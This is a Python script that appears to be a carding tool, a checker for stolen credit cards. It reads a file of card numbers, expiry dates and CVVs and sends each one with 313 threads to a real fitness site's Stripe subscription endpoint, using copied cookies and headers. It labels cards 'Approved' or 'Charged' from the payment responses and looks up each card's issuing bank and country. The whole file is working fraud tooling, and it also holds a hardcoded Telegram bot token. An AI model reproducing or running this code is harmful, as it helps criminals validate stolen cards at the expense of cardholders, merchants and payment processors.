import os
import time
import requests
import threading
from queue import Queue
from pyfiglet import figlet_format

# Hardcoded Telegram credentials
token = '7219723045:AAGaebZt8zi14g_28Mci-D1C7k2WGG80u2o'
Id = '5450488902'

# Get the combo file name from user
po = input('- Enter Name Combo • ادخل اسم الكومبو -> ')

# Load combo file
try:
    file = open(po, 'r').read().splitlines()
except FileNotFoundError:
    exit(f'\n\033[1;31m- No File With Name • لايوجد ملف بهذا الاسم -> [ {po} ]')

def St(kil):
    n, mm, yy, cvv = kil.split('|')
    if '20' in yy:
        yy = yy.replace('20', '')
    print(n, '\n', mm, '\n', yy, '\n', cvv)

    cookies = {
        '_ga': 'GA1.1.558755.1716770739',
        'optiMonkClientId': 'b5c04dce-bebf-0e33-7782-185a6dd3d615',
        '_gcl_au': '1.1.1807311372.1716770739',
        'ci_session': 'ku393n3cs4uuvh2e9rktmtb3qp0a2uga',
        '_ga_4HXMJ7D3T6': 'GS1.1.1721333961.2.0.1721333961.0.0.0',
        '_ga_KQ5ZJRZGQR': 'GS1.1.1721333962.2.0.1721333969.0.0.0',
    }

    headers = {
        'authority': 'www.lagreeod.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.lagreeod.com',
        'referer': 'https://www.lagreeod.com/subscribe-payment',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'card[name]': 'Kowla bobo',
        'card[number]': n,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'card[cvc]': cvv,
        'coupon': '',
        's1': '19',
        'sum': '38',
    }

    response = requests.post(
        'https://www.lagreeod.com/register/validate_subscribe_step_3',
        cookies=cookies,
        headers=headers,
        data=data,
    )
    text = response.text
    if 'message' in text:
        try:
            return response.json()['message']
        except:
            return text

def process_card(q):
    while not q.empty():
        cc = q.get()
        ko = str(St(cc))
        if "Your card has insufficient funds." in ko:
            api = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()
            try:
                chh = api['scheme']
                ch = chh.upper()
            except:
                ch = 'False'
            try:
                typ = api['type']
                type = typ.upper()
            except:
                type = 'False'
            try:
                raa = api['brand']
                ra = raa.upper()
            except:
                ra = 'False'
            try:
                am = api['bank']['name']
                ame = am.upper()
            except:
                ame = 'False'
            try:
                co = api['country']['name']
                cou = co
            except:
                cou = 'False'
            try:
                emoji = api['country']['emoji']
            except:
                emoji = 'False'
            m = f'''
Approved Card ✅
- - - - - - - - - - - - - - - - - - - - - - -
CC -> {cc}
Gateway -> Stripe Charge 3.99 $⚡
Response -> Your card has insufficient funds.
- - - - - - - - - - - - - - - - - - - - - - -
Bin -> {cc[:6]}
Bin Info -> {ch} - {type} - {ra}
Bank -> {ame}
Country -> {cou} {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
Dev : @Lx0b2 '''
            print(f'''\033[1;32m {m}''')
        elif 'was declined' in ko or 'number' in ko:
            print(f'''\033[1;31m
Visa is Declined ✗
Visa = {cc}
Message = {ko}''')
        elif 'Retry later' in ko:
            print(f'''\033[1;31m{cc} | Retry later''')
        elif 'requires_action' in ko:
            api = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()
            try:
                chh = api['scheme']
                ch = chh.upper()
            except:
                ch = 'False'
            try:
                typ = api['type']
                type = typ.upper()
            except:
                type = 'False'
            try:
                raa = api['brand']
                ra = raa.upper()
            except:
                ra = 'False'
            try:
                am = api['bank']['name']
                ame = am.upper()
            except:
                ame = 'False'
            try:
                co = api['country']['name']
                cou = co
            except:
                cou = 'False'
            try:
                emoji = api['country']['emoji']
            except:
                emoji = 'False'
            requir = (f'''
Charged Card ✅
- - - - - - - - - - - - - - - - - - - - - - -
CC -> {cc}
Gateway -> Stripe Charge 3.99$ ⚡
Response -> 3D Secure Charged 
- - - - - - - - - - - - - - - - - - - - - - -
Bin -> {cc[:6]}
Bin Info -> {ch} - {type} - {ra}
Bank -> {ame}
Country -> {cou} {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
Dev : @Lx0b2 ''')
            print(requir)
        else:
            api = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()
            try:
                chh = api['scheme']
                ch = chh.upper()
            except:
                ch = 'False'
            try:
                typ = api['type']
                type = typ.upper()
            except:
                type = 'False'
            try:
                raa = api['brand']
                ra = raa.upper()
            except:
                ra = 'False'
            try:
                am = api['bank']['name']
                ame = am.upper()
            except:
                ame = 'False'
            try:
                co = api['country']['name']
                cou = co
            except:
                cou = 'False'
            try:
                emoji = api['country']['emoji']
            except:
                emoji = 'False'
            m = f'''
Charged Card ✅
- - - - - - - - - - - - - - - - - - - - - - -
CC -> {cc}
Gateway -> Stripe Charge 3.99$ ⚡
Response -> {ko}
- - - - - - - - - - - - - - - - - - - - - - -
Bin -> {cc[:6]}
Bin Info -> {ch} - {type} - {ra}
Bank -> {ame}
Country -> {cou} {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
Dev : @Lx0b2 '''
            print(f'''\033[1;32m{m}''')
        q.task_done()

# Create a queue and add all cards to the queue
q = Queue()
for cc in file:
    q.put(cc)

# Create and start threads
num_threads = 313
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=process_card, args=(q,))
    t.start()
    threads.append(t)

# Wait for all threads to finish
q.join()
for t in threads:
    t.join()

print("All tasks completed.")
